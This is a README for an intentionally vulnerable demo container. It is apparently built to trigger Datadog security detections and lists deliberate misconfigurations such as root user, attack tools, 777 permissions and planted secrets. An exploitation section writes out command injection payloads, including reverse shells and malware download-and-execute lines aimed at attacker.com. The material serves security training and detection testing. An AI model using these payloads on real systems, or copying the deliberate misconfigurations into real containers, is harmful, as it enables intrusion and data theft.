# Ubuntu Base Image Vulnerabilities

## Overview

This application now uses **Ubuntu-based Node.js image** (`node:18`) instead of Alpine Linux to provide a **larger attack surface** and more vulnerabilities for security testing and demonstration.

## Why Ubuntu Instead of Alpine?

### Alpine Linux (Minimal)
- ✅ Minimal footprint (~5MB)
- ✅ Few packages
- ✅ Limited attack surface
- ❌ Less interesting for security testing

### Ubuntu (Feature-Rich)
- ✅ Full-featured OS (~100MB)
- ✅ Many installed packages
- ✅ More system utilities available to attackers
- ✅ Known CVEs in system packages
- ✅ Better for demonstrating Datadog security features

## Intentional Vulnerabilities Added

### 1. Running as Root User

**Issue**: Container runs as root (UID 0)

```dockerfile
# No USER directive - runs as root by default
```

**Impact**:
- Attackers gain full container privileges
- Can modify any file in the container
- Can install malware
- Can create backdoor users
- Privilege escalation attacks succeed easily

**Detection**: Datadog CWS/CSM will flag containers running as root

### 2. Excessive System Tools

**Installed packages that help attackers**:

```dockerfile
# Network reconnaissance tools
nmap              # Port scanning
netcat-traditional # Backdoor connections
tcpdump           # Network sniffing
telnet            # Unencrypted connections
dnsutils          # DNS enumeration

# Development tools (for compiling exploits)
gcc, g++, make    # Compile malicious code
git               # Clone exploit repositories

# File transfer tools
ftp               # Insecure file transfer
wget, curl        # Download malware
openssh-client    # SSH to other systems

# Shell utilities
bash, zsh         # Advanced shell features for attackers
vim, nano         # Edit files and configs

# Scripting
python3, pip      # Run exploit scripts
```

**Why This Is Bad**:
- Attackers don't need to download tools
- Can compile and run exploits immediately
- Easy to establish persistence
- Facilitates lateral movement

### 3. Outdated Python Packages

**Vulnerable versions installed**:

```dockerfile
# VULNERABILITY: Using --break-system-packages violates PEP 668
# This bypasses Python's protection against breaking the system
RUN pip3 install --no-cache-dir --break-system-packages \
    requests==2.25.1    # CVE-2023-32681 (Proxy-Authorization header leak)
    urllib3==1.26.5     # Multiple CVEs
```

**Why This Is Vulnerable**:
- Uses `--break-system-packages` flag (PEP 668 violation)
- Bypasses Python's safety mechanisms
- Can break system Python installation
- Installs packages globally instead of in virtual environment

**CVEs Present**:
- **requests 2.25.1**: CVE-2023-32681 (Proxy credentials leak)
- **urllib3 1.26.5**: CVE-2021-33503, CVE-2023-43804, CVE-2023-45803

**Detection**: Datadog SCA will identify these vulnerable packages

### 4. Overly Permissive File Permissions

```dockerfile
# VULNERABILITY: Everything is world-writable
RUN chmod -R 777 /app
RUN chmod 777 /var/log/pizzacoffee
RUN chmod 777 /etc/datadog
```

**Impact**:
- Any process can modify application code
- Logs can be tampered with
- Configuration files can be altered
- Easy to plant backdoors

### 5. Hardcoded Secrets in Filesystem

**Created file**: `/app/.secrets`

```bash
INTERNAL_API_KEY=super_secret_key_12345
DATABASE_BACKUP_PASSWORD=backup_pass_9876
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Why This Is Vulnerable**:
- Secrets stored in plaintext
- World-readable (chmod 644)
- Discoverable by attackers
- Can be exfiltrated via command injection

### 6. Bash History with Sensitive Commands

**Created file**: `/root/.bash_history`

```bash
mysql -u root -prootpass123 pizzacoffee
curl -X POST https://api.example.com/webhook -d @secrets.json
```

**What Attackers Learn**:
- Database credentials
- API webhook endpoints
- Internal API endpoints
- Command patterns used

## Exploitation Examples

### 1. Discover Secrets via Command Injection

Using the checkout order notes vulnerability:

```bash
# Order notes input:
"; cat /app/.secrets; echo "

# Output reveals:
INTERNAL_API_KEY=super_secret_key_12345
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
...
```

### 2. Read Bash History

```bash
# Order notes input:
"; cat /root/.bash_history; echo "

# Reveals database password:
mysql -u root -prootpass123 pizzacoffee
```

### 3. Network Reconnaissance with nmap

```bash
# Order notes input:
"; nmap -sn 172.18.0.0/24; echo "

# Discovers other containers:
172.18.0.1 (host)
172.18.0.2 (mysql)
172.18.0.3 (datadog-agent)
```

### 4. Establish Reverse Shell with Netcat

```bash
# Order notes input:
"; nc -e /bin/bash attacker.com 4444; echo "

# Or using bash:
"; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'; echo "
```

### 5. Download and Execute Malware

```bash
# Order notes input:
"; wget http://attacker.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh; echo "

# Or with curl:
"; curl http://attacker.com/malware.sh | bash; echo "
```

### 6. Compile and Run Exploit

```bash
# Order notes input:
"; echo '#include <stdio.h>\nint main(){system(\"/bin/bash\");}' > /tmp/exp.c && gcc /tmp/exp.c -o /tmp/exp && /tmp/exp; echo "
```

### 7. Clone Exploit Repositories

```bash
# Order notes input:
"; git clone https://github.com/attacker/exploits.git /tmp/exploits && python3 /tmp/exploits/run.py; echo "
```

### 8. Packet Capture with tcpdump

```bash
# Order notes input:
"; tcpdump -i eth0 -w /tmp/capture.pcap & echo "

# Later retrieve the capture file
```

## Datadog Detection

### CSM Threats (Cloud Workload Security)

Will detect:
- Container running as root
- Suspicious process executions (nmap, nc, tcpdump)
- Network connections to external IPs
- File modifications in sensitive directories
- New processes spawned from web application

### CSM Misconfigurations

Will flag:
- Container running as root (CIS benchmark violation)
- Excessive capabilities granted
- Overly permissive file permissions
- No resource limits set
- Privileged containers

### SCA (Software Composition Analysis)

Will identify:
- Vulnerable Python packages (requests, urllib3)
- Outdated system libraries
- Known CVEs in installed packages

### ASM (Application Security Management)

Will detect:
- Command injection attempts
- Malicious payloads in order notes
- File access patterns (reading .secrets, .bash_history)
- Network scanning activities

## Size Comparison

| Image Type | Base Size | With Packages | Total |
|-----------|-----------|---------------|-------|
| Alpine | ~5MB | +30MB | ~150MB |
| Ubuntu | ~100MB | +200MB | ~450MB |

The Ubuntu-based image is **3x larger**, providing:
- More attack surface
- More exploitable tools
- More CVEs to detect
- Better demonstration of security features

## Testing Security Detection

### 1. Build the New Image

```bash
docker-compose build app
```

### 2. Start the Environment

```bash
docker-compose up -d
```

### 3. Trigger Detections

**CSM Threats Detection**:
```bash
# Execute nmap scan via command injection
curl -X POST http://localhost:3000/orders/place \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "deliveryAddress": "123 Test St",
    "deliveryPhone": "555-1234",
    "paymentMethod": "credit_card",
    "notes": "\"; nmap -sn 172.18.0.0/24; echo \""
  }'
```

**SCA Detection**:
```bash
# Check running containers - SCA will scan the image
docker-compose ps
```

**Secret Discovery**:
```bash
# Access container and find secrets
docker exec pizzacoffee-app cat /app/.secrets
```

### 4. View in Datadog

**CSM Threats Signals**:
1. Navigate to **Security → Cloud Workload Security → Signals**
2. Look for signals like:
   - "Container running as root"
   - "Suspicious network scan detected"
   - "Unexpected process execution"

**SCA Vulnerabilities**:
1. Navigate to **Security → Vulnerabilities → Container Images**
2. Find the `insecure-pizza-coffee` image
3. View detected CVEs in system packages and Python libraries

**CSM Misconfigurations**:
1. Navigate to **Security → Compliance → Findings**
2. Look for CIS Docker Benchmark violations

## Benefits for Security Testing

### 1. **Realistic Attack Scenarios**
- Demonstrates what attackers find in real compromised containers
- Shows how tools facilitate post-exploitation
- Illustrates importance of minimal base images

### 2. **Complete Detection Coverage**
- CSM detects runtime threats
- SCA detects vulnerable packages
- ASM detects application attacks
- Compliance detects misconfigurations

### 3. **Training Value**
- Teaches defenders what to look for
- Shows real-world attack techniques
- Demonstrates security best practices by violating them

### 4. **Datadog Feature Showcase**
- Multiple detection methods trigger
- Correlation between different security signals
- End-to-end security visibility

## Security Best Practices (For Reference)

⚠️ **DO NOT FIX** - These are intentional vulnerabilities

In production, you should:

1. **Use minimal base images** (Alpine, Distroless)
2. **Run as non-root user**
   ```dockerfile
   USER node
   ```
3. **Set read-only filesystem**
   ```dockerfile
   --read-only
   ```
4. **Remove unnecessary tools**
   ```dockerfile
   RUN apt-get remove -y nmap netcat gcc make
   ```
5. **Use .dockerignore** to exclude sensitive files
6. **Never hardcode secrets** - use secrets management
7. **Apply least privilege** - minimal capabilities
8. **Keep packages updated**
   ```dockerfile
   RUN apt-get update && apt-get upgrade -y
   ```

## Container Security Checklist

This container violates all of these:

- [ ] Runs as non-root user
- [ ] Uses minimal base image
- [ ] No unnecessary packages installed
- [ ] Packages are up-to-date
- [ ] No secrets in image layers
- [ ] Read-only filesystem where possible
- [ ] Minimal Linux capabilities
- [ ] Security scanning in CI/CD
- [ ] No bash history in image
- [ ] Proper file permissions (not 777)

## Additional Resources

- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)
- [NIST Container Security Guidelines](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)
- [Datadog Container Security](https://docs.datadoghq.com/security/cloud_workload_security/)

---

**⚠️ Remember**: This is an intentionally vulnerable container for security testing. Never deploy to production!

The Ubuntu base image provides a **rich target environment** for demonstrating Datadog's comprehensive security detection capabilities.
